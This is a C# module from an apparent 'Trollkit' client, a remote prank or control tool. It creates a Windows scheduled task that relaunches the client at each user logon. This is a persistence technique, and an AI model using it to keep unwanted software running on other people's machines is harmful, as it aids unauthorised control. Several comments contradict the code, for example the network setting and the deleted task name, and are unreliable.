using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using TaskScheduler;
using Trollkit_Library;

namespace Trollkit_Client.Modules
{
	public class TaskSchedulerHelper
	{
		TaskScheduler.TaskScheduler objScheduler;
		ITaskDefinition objTaskDef;
		ILogonTrigger objTrigger;
		IExecAction objAction;

		/// <summary>
		/// Creates a task in the Windows TaskScheduler.
		/// The task runs the executable in the provided path parameter at user logon.
		/// </summary>
		/// <param name="path">path to executable</param>
		public void CreateTask(string path)
		{
			try
			{
				objScheduler = new TaskScheduler.TaskScheduler();
				objScheduler.Connect();

				SetTaskDefinition();
				SetTriggerInfo();
				SetActionInfo(path);

				ITaskFolder root = objScheduler.GetFolder("\\");
				IRegisteredTask regTask = root.RegisterTaskDefinition("Trollkit Client", objTaskDef, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, null, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, "");
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		/// <summary>
		/// TODO: rename and add function in the HOST
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void btnDeleteTask_Click(object sender, EventArgs e)
		{
			try
			{
				TaskScheduler.TaskScheduler objScheduler = new TaskScheduler.TaskScheduler();
				objScheduler.Connect();

				ITaskFolder containingFolder = objScheduler.GetFolder("\\");
				//Deleting the task
				containingFolder.DeleteTask("SampleTask", 0);  //Give name of the Task				
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		/// <summary>
		/// Sets a task definition
		/// </summary>
		private void SetTaskDefinition()
		{
			try
			{
				objTaskDef = objScheduler.NewTask(0);
				//Registration Info for task
				//Name of the task Author
				objTaskDef.RegistrationInfo.Author = "Trollkit";
				//Description of the task 
				objTaskDef.RegistrationInfo.Description = "Trollkit Client Start";
				//Registration date of the task 
				objTaskDef.RegistrationInfo.Date = DateTime.Today.ToString("yyyy-MM-ddTHH:mm:ss"); //Date format 

				//Settings for task
				//Thread Priority
				objTaskDef.Settings.Priority = 7;
				//Enabling the task
				objTaskDef.Settings.Enabled = true;
				//To hide/show the task
				objTaskDef.Settings.Hidden = false;
				//Execution Time Lmit for task
				//objTaskDef.Settings.
				//objTaskDef.Settings.ExecutionTimeLimit = "PT10M"; //10 minutes
																  //Specifying no need of network connection
				objTaskDef.Settings.RunOnlyIfNetworkAvailable = true;
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		private void SetTriggerInfo()
		{
			try
			{
				//Trigger information based on time - TASK_TRIGGER_TIME
				objTrigger = (ILogonTrigger)objTaskDef.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
				//Trigger ID
				objTrigger.UserId = WindowsIdentity.GetCurrent().Name;
				objTrigger.Id = "Trollkit Trigger";	
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		private void SetActionInfo(string exePath)
		{
			try
			{
				//Action information based on exe- TASK_ACTION_EXEC
				objAction = (IExecAction)objTaskDef.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
				//Action ID
				objAction.Id = "Trollkit boot action";
				//Set the path of the exe file to execute, Here mspaint will be opened
				objAction.Path = exePath;
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}
	}
}
